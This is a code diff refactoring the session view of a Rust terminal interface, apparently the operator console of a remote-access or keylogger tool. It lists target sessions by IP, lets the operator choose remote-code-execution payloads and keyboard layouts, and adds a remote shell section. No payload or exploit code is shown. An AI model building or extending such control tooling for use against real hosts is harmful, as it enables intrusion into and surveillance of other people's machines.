@@ -7,6 +7,7 @@ use ratatui::{
 };
 use tamanoir_common::{Layout as KeyboardLayout, TargetArch};
 
+use super::shell::{SessionShellSection, ShellCommandHistoryMap};
 use crate::{
     app::{AppResult, SessionsMap},
     grpc::{RceServiceClient, SessionServiceClient},
@@ -15,12 +16,13 @@ use crate::{
 
 #[derive(Debug)]
 pub struct SessionSection {
-    sessions: SessionsMap,
+    sessions_map: SessionsMap,
     state: TableState,
     scroll_state: ScrollbarState,
     pub selected_session: Option<SessionResponse>,
     pub edition_mode: bool,
-    session_edit_subsection: SessionEditSubsection,
+    edit_section: SessionEditSection,
+    pub shell: SessionShellSection,
 }
 
 fn compute_payload_tx_pct(total_len: u32, remaining_len: u32) -> u8 {
@@ -29,48 +31,50 @@ fn compute_payload_tx_pct(total_len: u32, remaining_len: u32) -> u8 {
 
 impl SessionSection {
     pub async fn new(
-        sessions: SessionsMap,
+        sessions_map: SessionsMap,
+        shell_history_map: ShellCommandHistoryMap,
         session_client: &mut SessionServiceClient,
         rce_client: &mut RceServiceClient,
     ) -> AppResult<Self> {
         for s in session_client.list_sessions().await? {
-            sessions.write().unwrap().insert(s.ip.clone(), s);
+            sessions_map.write().unwrap().insert(s.ip.clone(), s);
         }
-        let selected_session = sessions.read().unwrap().values().nth(0).cloned();
+        let selected_session = sessions_map.read().unwrap().values().nth(0).cloned();
         let available_rce_payloads = Some(rce_client.list_available_rce().await?);
-        let session_edit_subsection = SessionEditSubsection::new(available_rce_payloads);
+        let edit_section = SessionEditSection::new(available_rce_payloads);
+        let shell = SessionShellSection::new(shell_history_map);
         Ok(Self {
-            sessions,
+            sessions_map,
             state: TableState::default().with_selected(0),
             scroll_state: ScrollbarState::new(0),
             selected_session,
             edition_mode: false,
-            session_edit_subsection,
+            edit_section,
+            shell,
         })
     }
 
     pub fn is_editing(&self) -> bool {
         self.selected_session.is_some() && self.edition_mode
     }
+
     pub async fn apply_change(
         &mut self,
         session_client: &mut SessionServiceClient,
         rce_client: &mut RceServiceClient,
     ) -> AppResult<()> {
         if self.edition_mode {
-            let selected = self.session_edit_subsection.state().selected().unwrap();
+            let selected = self.edit_section.state().selected().unwrap();
 
-            match self.session_edit_subsection.editing_section {
+            match self.edit_section.editing_section {
                 EditSubsection::KeyboardLayout => {
-                    let selected = self.session_edit_subsection.available_layouts[selected];
+                    let selected = self.edit_section.available_layouts[selected];
                     session_client
                         .update_session_layout(self.selected_session.clone().unwrap().ip, selected)
                         .await
                 }
                 EditSubsection::RcePayload => {
-                    if let Some(avail_payloads) =
-                        &self.session_edit_subsection.available_rce_payloads
-                    {
+                    if let Some(avail_payloads) = &self.edit_section.available_rce_payloads {
                         let selected = &avail_payloads[selected];
                         if selected.name != "-" {
                             rce_client
@@ -96,32 +100,32 @@ impl SessionSection {
     }
     pub fn next_item(&mut self) {
         if self.edition_mode {
-            self.session_edit_subsection.scroll_down()
+            self.edit_section.scroll_down()
         } else {
             self.scroll_down()
         }
     }
     pub fn previous_item(&mut self) {
         if self.edition_mode {
-            self.session_edit_subsection.scroll_up()
+            self.edit_section.scroll_up()
         } else {
             self.scroll_up()
         }
     }
     pub fn next_edit_section(&mut self) {
         if self.edition_mode {
-            self.session_edit_subsection.next_edit_section()
+            self.edit_section.next_edit_section()
         }
     }
     pub fn previous_edit_section(&mut self) {
         if self.edition_mode {
-            self.session_edit_subsection.previous_edit_section()
+            self.edit_section.previous_edit_section()
         }
     }
     pub fn scroll_down(&mut self) {
         let i = match self.state.selected() {
             Some(i) => {
-                if i >= self.sessions.read().unwrap().len() - 1 {
+                if i >= self.sessions_map.read().unwrap().len() - 1 {
                     0
                 } else {
                     i + 1
@@ -131,18 +135,19 @@ impl SessionSection {
         };
         self.state.select(Some(i));
         self.scroll_state = self.scroll_state.position(i);
-        self.selected_session = if let Some((_, v)) = self.sessions.read().unwrap().iter().nth(i) {
-            Some(v.clone())
-        } else {
-            None
-        };
+        self.selected_session =
+            if let Some((_, v)) = self.sessions_map.read().unwrap().iter().nth(i) {
+                Some(v.clone())
+            } else {
+                None
+            };
     }
 
     pub fn scroll_up(&mut self) {
         let i = match self.state.selected() {
             Some(i) => {
                 if i == 0 {
-                    self.sessions.read().unwrap().len() - 1
+                    self.sessions_map.read().unwrap().len() - 1
                 } else {
                     i - 1
                 }
@@ -151,23 +156,23 @@ impl SessionSection {
         };
         self.state.select(Some(i));
         self.scroll_state = self.scroll_state.position(i);
-        self.selected_session = self.sessions.read().unwrap().values().nth(i).cloned();
+        self.selected_session = self.sessions_map.read().unwrap().values().nth(i).cloned();
     }
     pub fn unselect(&mut self) {
         self.state.select(None);
         self.scroll_state = self
             .scroll_state
-            .position(self.sessions.read().unwrap().len());
+            .position(self.sessions_map.read().unwrap().len());
     }
     pub fn render_session_edition(&mut self, frame: &mut Frame, block: Rect) {
         let selected_row_style = Style::default()
             .add_modifier(Modifier::REVERSED)
             .fg(Color::LightBlue);
-        let table = match self.session_edit_subsection.editing_section {
+        let table = match self.edit_section.editing_section {
             EditSubsection::KeyboardLayout => {
                 let header = Row::new([Span::from("Keyboard Layout").bold()]);
                 let rows: Vec<Row> = self
-                    .session_edit_subsection
+                    .edit_section
                     .available_layouts
                     .clone()
                     .into_iter()
@@ -179,7 +184,7 @@ impl SessionSection {
                 let header =
                     Row::new([Span::from("Name").bold(), Span::from("Target Arch").bold()]);
 
-                let rows: Vec<Row> = match &self.session_edit_subsection.available_rce_payloads {
+                let rows: Vec<Row> = match &self.edit_section.available_rce_payloads {
                     Some(payloads) => payloads
                         .into_iter()
                         .map(|p| {
@@ -194,11 +199,11 @@ impl SessionSection {
                 Table::new(rows, [Constraint::Fill(1), Constraint::Fill(1)]).header(header)
             }
         };
-        let style_0 = match self.session_edit_subsection.editing_section {
+        let style_0 = match self.edit_section.editing_section {
             EditSubsection::KeyboardLayout => Style::default().fg(Color::Yellow).bold(),
             EditSubsection::RcePayload => Style::default().fg(Color::Blue),
         };
-        let style_1 = match self.session_edit_subsection.editing_section {
+        let style_1 = match self.edit_section.editing_section {
             EditSubsection::KeyboardLayout => Style::default().fg(Color::Blue),
             EditSubsection::RcePayload => Style::default().fg(Color::Yellow).bold(),
         };
@@ -222,7 +227,7 @@ impl SessionSection {
                     .title(Span::styled("Update RCE Payload", style_1)),
             ),
             block,
-            self.session_edit_subsection.state(),
+            self.edit_section.state(),
         );
     }
     fn render_session_info(&self, frame: &mut Frame, block: Rect) {
@@ -324,7 +329,7 @@ impl SessionSection {
     fn sync_selected_session(&mut self) {
         //called every app tick, to sync selected session with its value in SessionStore
         self.selected_session = match &self.selected_session {
-            Some(session) => self.sessions.read().unwrap().get(&session.ip).cloned(),
+            Some(session) => self.sessions_map.read().unwrap().get(&session.ip).cloned(),
             None => None,
         }
     }
@@ -343,7 +348,7 @@ impl SessionSection {
             .fg(Color::LightBlue);
 
         let rows: Vec<Row> = {
-            let reader = self.sessions.read().unwrap();
+            let reader = self.sessions_map.read().unwrap();
             reader
                 .iter()
                 .map(|(k, _)| {
@@ -375,7 +380,7 @@ impl SessionSection {
     }
 }
 #[derive(Debug)]
-struct SessionEditSubsection {
+struct SessionEditSection {
     editing_section: EditSubsection,
 
     available_layouts: Vec<KeyboardLayout>,
@@ -391,7 +396,7 @@ enum EditSubsection {
     KeyboardLayout,
     RcePayload,
 }
-impl SessionEditSubsection {
+impl SessionEditSection {
     pub fn new(available_rce_payloads: Option<Vec<SessionRcePayload>>) -> Self {
         let available_layouts = KeyboardLayout::ALL;
         let available_rce_payloads = match available_rce_payloads {
